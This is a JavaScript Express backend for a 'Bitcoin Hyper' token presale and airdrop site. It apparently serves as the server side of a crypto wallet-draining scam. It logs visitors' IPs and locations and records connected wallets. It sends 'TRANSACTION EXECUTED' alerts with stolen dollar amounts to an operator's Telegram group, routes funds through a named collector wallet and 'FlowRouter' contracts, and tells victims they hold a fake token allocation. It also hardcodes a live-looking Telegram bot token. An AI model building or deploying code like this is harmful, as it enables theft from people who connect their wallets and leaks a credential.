// index.js - BITCOIN HYPER BACKEND - WORKING TELEGRAM VERSION
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : [
      'http://localhost:3000', 
      'https://hyperaidrop.vercel.app',
      'https://hyperback-psi.vercel.app',
      'https://bitcoinhypertoken.vercel.app'
    ];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// TELEGRAM CONFIGURATION - HARDCODED WORKING VALUES
// ============================================
const TELEGRAM_BOT_TOKEN = '8409198592:AAFD6pJhv-Hlv1TYkLWQnjyzDUYXghVhFmI';
const TELEGRAM_CHAT_ID = '-1003922015070';  // CORRECT GROUP CHAT ID

let telegramEnabled = false;
let telegramBotName = '';

// ============================================
// TELEGRAM FUNCTIONS - DIRECT WORKING VERSION
// ============================================

async function sendTelegramMessage(text) {
  console.log(`\n📤 Sending Telegram message...`);
  
  try {
    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    }, { 
      timeout: 15000,
      headers: { 'Content-Type': 'application/json' }
    });
    
    if (response.data?.ok) {
      console.log('✅ Telegram message sent successfully');
      telegramEnabled = true;
      return true;
    } else {
      console.error('❌ Telegram API error:', response.data);
      return false;
    }
  } catch (error) {
    console.error('❌ Telegram send error:', error.message);
    if (error.response?.data) {
      console.error('   Details:', JSON.stringify(error.response.data));
    }
    return false;
  }
}

async function testTelegramConnection() {
  console.log('🔧 Testing Telegram connection...');
  console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 15)}...`);
  console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
  
  try {
    // Test bot token
    const meResponse = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`, { timeout: 10000 });
    
    if (!meResponse.data?.ok) {
      console.error('❌ Invalid bot token');
      return false;
    }
    
    telegramBotName = meResponse.data.result.username;
    console.log(`✅ Bot authenticated: @${telegramBotName}`);
    
    // Send startup message
    const startMessage = 
      `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `✅ MultiChain FlowRouter Ready\n` +
      `🔗 Backend: hyperback-psi.vercel.app\n` +
      `🌍 Frontend: hyperaidrop.vercel.app\n` +
      `🕐 Started: ${new Date().toLocaleString()}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📦 Collector: 0x50C14Ec...af67B7\n` +
      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche`;
    
    const sendResult = await sendTelegramMessage(startMessage);
    
    if (sendResult) {
      console.log('✅✅✅ TELEGRAM IS WORKING! ✅✅✅');
      telegramEnabled = true;
      return true;
    } else {
      console.error('❌ Failed to send test message');
      telegramEnabled = false;
      return false;
    }
    
  } catch (error) {
    console.error('❌ Telegram test error:', error.message);
    telegramEnabled = false;
    return false;
  }
}

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    backendUrl: 'https://hyperback-psi.vercel.app',
    frontendUrl: 'https://hyperaidrop.vercel.app',
    telegram: telegramEnabled ? 'connected' : 'connecting...',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// HEALTH ENDPOINT
// ============================================

app.get('/api/health', (req, res) => {
  res.json({ 
    success: true, 
    status: 'ACTIVE',
    backend: 'https://hyperback-psi.vercel.app',
    telegram: telegramEnabled ? 'connected' : 'disabled'
  });
});

// ============================================
// DIRECT TELEGRAM TEST ENDPOINT
// ============================================

app.get('/api/test-telegram', async (req, res) => {
  const testMessage = req.query.message || `🧪 Test message at ${new Date().toLocaleString()}`;
  
  try {
    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: testMessage,
      parse_mode: 'HTML'
    }, { timeout: 10000 });
    
    res.json({
      success: response.data?.ok || false,
      chatIdUsed: TELEGRAM_CHAT_ID,
      botUsed: TELEGRAM_BOT_TOKEN.substring(0, 15) + '...',
      response: response.data
    });
  } catch (error) {
    res.json({
      success: false,
      chatIdUsed: TELEGRAM_CHAT_ID,
      error: error.response?.data || error.message
    });
  }
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: ['https://eth.llamarpc.com', 'https://ethereum.publicnode.com', 'https://rpc.ankr.com/eth'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: ['https://bsc-dataseed.binance.org', 'https://bsc-dataseed1.binance.org'],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: ['https://polygon-rpc.com', 'https://rpc-mainnet.maticvigil.com'],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: ['https://arb1.arbitrum.io/rpc', 'https://rpc.ankr.com/arbitrum'],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Avalanche: {
    urls: ['https://api.avax.network/ext/bc/C/rpc', 'https://rpc.ankr.com/avalanche'],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      if (block > 0) {
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  return null;
}

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
  'BSC': '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
  'Polygon': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
  'Arbitrum': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
  'Avalanche': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
  'Optimism': null
};

const COLLECTOR_WALLET = '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';

const memoryStorage = {
  participants: [],
  pendingFlows: new Map(),
  completedFlows: new Map(),
  settings: {
    tokenName: 'Bitcoin Hyper',
    tokenSymbol: 'BTH',
    valueThreshold: 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0,
      totalProcessedWallets: 0,
      processedTransactions: []
    }
  },
  emailCache: new Map(),
  siteVisits: []
};

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    if (response.data?.status === 'success') {
      const flags = { 'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦', 'Germany': '🇩🇪', 'France': '🇫🇷', 'Nigeria': '🇳🇬' };
      return { country: response.data.country, flag: flags[response.data.country] || '🌍', city: response.data.city || '' };
    }
  } catch (error) {}
  return { country: 'Unknown', flag: '🌍', city: '' };
}

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: { ids: 'ethereum,binancecoin,matic-network,avalanche-2', vs_currencies: 'usd' },
      timeout: 5000
    });
    return { eth: response.data.ethereum?.usd || 2000, bnb: response.data.binancecoin?.usd || 300, matic: response.data['matic-network']?.usd || 0.75, avax: response.data['avalanche-2']?.usd || 32 };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// TRACK VISIT ENDPOINT
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    const location = await getIPLocation(clientIP);
    const humanInfo = { isHuman: !/bot|crawler|spider/i.test(userAgent), deviceType: /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop' };
    
    const visit = {
      id: `VISIT-${Date.now()}`,
      ip: clientIP,
      timestamp: new Date().toISOString(),
      country: location.country,
      flag: location.flag,
      city: location.city,
      userAgent: userAgent || 'Unknown',
      referer: referer || 'Direct',
      isHuman: humanInfo.isHuman,
      deviceType: humanInfo.deviceType
    };
    
    memoryStorage.siteVisits.push(visit);
    
    await sendTelegramMessage(
      `${visit.isHuman ? '👤' : '🤖'} <b>🌐 NEW SITE VISIT</b>\n` +
      `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
      `🌐 <b>IP:</b> ${visit.ip}\n` +
      `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
      `🔗 <b>Source:</b> ${referer || 'Direct'}`
    );
    
    res.json({ success: true, data: { country: location.country, flag: location.flag, city: location.city, isHuman: humanInfo.isHuman } });
  } catch (error) {
    res.json({ success: true });
  }
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const location = await getIPLocation(clientIP);
    const email = `user${crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex').substring(0, 8)}@proton.me`;
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = { walletAddress: walletAddress.toLowerCase(), country: location.country, flag: location.flag, email: email, connectedAt: new Date(), totalValueUSD: 0, isEligible: false };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      
      await sendTelegramMessage(
        `🆕 <b>NEW PARTICIPANT</b>\n👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n📍 <b>Location:</b> ${location.country} ${location.flag}\n📧 <b>Email:</b> ${email}`
      );
    }
    
    res.json({ success: true, data: { walletAddress, email, country: location.country, flag: location.flag, totalValueUSD: 0, isEligible: false } });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// EXECUTE FLOW ENDPOINT
// ============================================

app.post('/api/presale/execute-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash, amount, symbol, valueUSD } = req.body;
    
    console.log(`💰 EXECUTE FLOW: ${walletAddress?.substring(0, 10)} on ${chainName} - $${valueUSD}`);
    
    await sendTelegramMessage(
      `💰 <b>TRANSACTION EXECUTED</b>\n👛 <b>Wallet:</b> ${walletAddress?.substring(0, 10)}...${walletAddress?.substring(38)}\n🔗 <b>Chain:</b> ${chainName}\n💵 <b>Amount:</b> ${amount} ${symbol} ($${valueUSD})\n🆔 <b>Tx Hash:</b> <code>${txHash}</code>`
    );
    
    res.json({ success: true });
  } catch (error) {
    console.error('Execute flow error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const claimId = `BTH-${Date.now()}`;
    
    await sendTelegramMessage(
      `🎉 <b>CLAIM COMPLETED</b>\n👛 <b>Wallet:</b> ${walletAddress?.substring(0, 10)}...${walletAddress?.substring(38)}\n🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n🎁 <b>Allocation:</b> 5000 BTH`
    );
    
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// ============================================
// PREPARE FLOW ENDPOINT
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  res.json({ success: true, data: { flowId: `FLOW-${Date.now()}`, totalFlowUSD: '0', transactionCount: 0, transactions: [] } });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND - WORKING TELEGRAM VERSION
  ===================================================
  📍 Port: ${PORT}
  🔗 Backend: https://hyperback-psi.vercel.app
  🌍 Frontend: https://hyperaidrop.vercel.app
  
  🤖 TELEGRAM CONFIGURATION:
     Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 15)}...
     Chat ID: ${TELEGRAM_CHAT_ID}
  `);
  
  await testTelegramConnection();
  
  console.log(`\n🚀 Server ready! Telegram status: ${telegramEnabled ? 'CONNECTED ✅' : 'DISABLED ❌'}`);
});
